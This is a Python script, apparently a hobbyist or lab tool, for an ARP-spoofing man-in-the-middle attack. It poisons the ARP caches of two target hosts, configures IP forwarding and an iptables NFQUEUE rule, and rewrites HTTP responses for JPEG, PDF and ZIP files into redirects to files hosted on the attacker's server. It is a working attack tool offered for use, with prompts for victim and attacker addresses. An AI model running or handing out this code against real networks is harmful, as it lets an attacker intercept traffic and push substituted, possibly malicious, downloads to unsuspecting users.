from scapy.all import ARP, Ether, srp, send, IP, TCP, Raw
import time
import sys
import threading
import netfilterqueue 
import os


global FILE_REPLACEMENTS

#MAC address spoofing here
def get_mac(ip):
    #make an Ethernet broadcast frame
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    #make an ARp request packet
    arp_request = ARP(pdst=ip)
    #Combine the two
    packet = broadcast / arp_request
    #send & receive
    answered_list = srp(packet, timeout=2, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] Critical Error: Could not find the MAC for {ip}. Is the target up?")
        sys.exit()


def spoof(target_ip, host_ip):
    #Get the MAC address of the target machine we want to send the fake ARP packet to
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Could not find MAC for {target_ip}")
        return
    #create the lie (fake packet); op=2 means it is an ARP "is-at" response
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    #send the lie
    send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    #send the real MAC associated with the real IP
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac )
    send(packet, count=4, verbose=False)

#This is for the file replacement attacks
def process_packet(packet):
    global FILE_REPLACEMENTS
    scapy_packet = IP(packet.get_payload())

    #Check if the packet has a Raw layer where HTTP data lives
    if scapy_packet.haslayer(Raw):
        load = scapy_packet[Raw].load

        #check if the victim is requesting any of the target extensions
        if scapy_packet[TCP].dport == 80:
            if any (ext in str(load) for ext in ['.jpg', '.pdf', '.zip']): 
                print(f"[+] Target requested a file...")

        #check if the server is sending any of the target extensions
        elif scapy_packet[TCP].sport == 80:
            selected_replacement = None

            #Check if the server response has any target MIME types bc they don't usually list file extensions in the headers like they do with .jpgs
            for mime_type, replacement_url in FILE_REPLACEMENTS.items():
                if mime_type.encode() in load:
                    selected_replacement = replacement_url
                    break #stop looking when it finds a match

            if selected_replacement:
                print(f"[!] Intercepting {mime_type}! Redirecting to {selected_replacement}...")

                #Replace the data with a different file/image

                #Note that the image cannot be stored on a drive; it needs to be hosted on a live web page

                fake_load = f"HTTP/1.1 301 Moved Permanently\nLocation: {selected_replacement}\r\n\r\n" 
                
      

                #update the packet with new data

                scapy_packet[Raw].load = fake_load

                #Delete checksums so Scapy recalculates them automatically

                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum

                #set the modified payload back to the original packet
                packet.set_payload(bytes(scapy_packet))

    packet.accept() #forward the packet to the victim


def arp_loop(v1, v2):
    while True:
        spoof(v1, v2)
        spoof(v2, v1)
        time.sleep(2)


#Main execution loop


#sets up IP forwarding and configures IP tables so you don't have to
os.system("sysctl -w net.ipv4.ip_forward=1")
os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1")

#get all necessary info at once:
attacker_IP = input("Enter your attacker machine's IP.\n")
port = input("Enter the port that your Python HTTP server runs on.\n")
fake_image = input("Enter the filename of your fake JPG. Do not include the extension.\n")
fake_pdf = input("Enter the filename of your fake PDF. Do not include the extension.\n")
fake_zip = input("Enter the filename of your fake ZIP file. Do not include the extension.\n")
victim1_ip = input("Enter the IP address of your first target.\n")  #Victim #1's IP goes here
victim2_ip = input("Enter the IP address of your second target.\n") # Victim #2's IP goes here


#dictionary of file replacements for later use; change the ATTACKER_IP to your attacker machine's IP
FILE_REPLACEMENTS = {
    "image/jpeg": f"http://{attacker_IP}:{port}/{fake_image}.jpg",
    "application/pdf": f"http://{attacker_IP}:{port}/{fake_pdf}.pdf",
    "application/zip": f"http://{attacker_IP}:{port}/{fake_zip}.zip"
}


#Start ARP spoofing in a separate thread so it doesn't block the packet queue
t = threading.Thread(target=arp_loop, args=(victim1_ip, victim2_ip), daemon=True)
t.start()

try:
    print("[+] MITM started.... Press Ctrl + C to stop.")
    print("[+] Intercepting HTTP images...")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1, process_packet) #Bindes to the iptables queue number 1
    queue.run()
except KeyboardInterrupt:
    print("\n [!] Detected Ctrl+C...Restoring network, please wait.")
    restore(victim1_ip, victim2_ip)
    restore(victim2_ip, victim1_ip)
    os.system("iptables -D FORWARD -j NFQUEUE --queue-num 1")
    print("[+] Network restored. Exiting.")

